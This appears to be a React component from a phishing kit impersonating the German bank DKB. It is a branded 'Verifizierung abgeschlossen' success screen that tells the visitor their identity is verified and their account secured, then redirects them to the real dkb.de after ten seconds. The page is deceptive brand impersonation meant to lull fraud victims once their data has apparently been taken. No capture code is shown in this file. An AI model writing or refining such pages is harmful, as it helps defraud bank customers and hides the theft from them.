import React, { useEffect } from 'react';

const FinalSuccessScreen: React.FC = () => {
  useEffect(() => {
    // Redirect after 10 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://www.dkb.de/';
    }, 10000);

    return () => clearTimeout(timer);
  }, []);

  const handleManualRedirect = () => {
    window.location.href = 'https://www.dkb.de/';
  };

  return (
    <div className="dkb-form-container">
      <div className="dkb-form-card" style={{ textAlign: 'center' }}>
        {/* Header with close button */}
        <div className="dkb-form-header">
          <button className="dkb-close-button" type="button">←</button>
          <h1 className="dkb-form-title">Verifizierung abgeschlossen</h1>
          <button className="dkb-close-button" type="button">×</button>
        </div>
        
        {/* Success Icon */}
        <div style={{
          marginBottom: '32px',
          display: 'flex',
          justifyContent: 'center'
        }}>
          <svg 
            width="64" 
            height="64" 
            viewBox="0 0 24 24" 
            fill="none" 
            xmlns="http://www.w3.org/2000/svg"
          >
            <circle cx="12" cy="12" r="10" fill="#11a6a1"/>
            <path d="m9 12 2 2 4-4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        
        <p className="dkb-form-description" style={{ marginBottom: '32px' }}>
          Ihre Identität wurde erfolgreich verifiziert. Ihr DKB Banking ist wieder sicher und zugänglich.
        </p>
        
        {/* Success Details */}
        <div style={{
          backgroundColor: 'rgba(17, 166, 161, 0.1)',
          border: '1px solid rgba(17, 166, 161, 0.2)',
          borderRadius: '8px',
          padding: '24px',
          marginBottom: '32px'
        }}>
          <div style={{
            display: 'flex',
            alignItems: 'center',
            gap: '12px',
            justifyContent: 'center',
            marginBottom: '16px'
          }}>
            <svg 
              width="24" 
              height="24" 
              viewBox="0 0 24 24" 
              fill="none" 
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" fill="#11a6a1"/>
              <path d="m9 12 2 2 4-4" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            <p style={{
              color: '#11a6a1',
              fontSize: '16px',
              fontWeight: '600',
              margin: 0,
              fontFamily: 'DKBEuclid, Arial, sans-serif'
            }}>
              Sicherheitsmaßnahmen aktiviert
            </p>
          </div>
          <p style={{
            color: 'rgba(204, 233, 255, 0.8)',
            fontSize: '14px',
            margin: 0,
            fontFamily: 'DKBEuclid, Arial, sans-serif',
            lineHeight: '1.4'
          }}>
            Alle Sicherheitsmaßnahmen wurden erfolgreich aktiviert. Ihr Konto ist jetzt vollständig geschützt.
          </p>
        </div>
        
        {/* Auto-redirect notice */}
        <div style={{
          backgroundColor: 'rgba(20, 141, 234, 0.1)',
          border: '1px solid rgba(20, 141, 234, 0.2)',
          borderRadius: '8px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <p style={{
            color: 'rgba(204, 233, 255, 0.8)',
            fontSize: '14px',
            margin: 0,
            fontFamily: 'DKBEuclid, Arial, sans-serif'
          }}>
            Sie werden automatisch zur DKB Startseite weitergeleitet...
          </p>
        </div>

        {/* Manual redirect button */}
        <button
          onClick={handleManualRedirect}
          className="dkb-submit-button"
          style={{ marginTop: '16px' }}
        >
          Jetzt zur DKB Startseite
        </button>
      </div>
    </div>
  );
};

export default FinalSuccessScreen;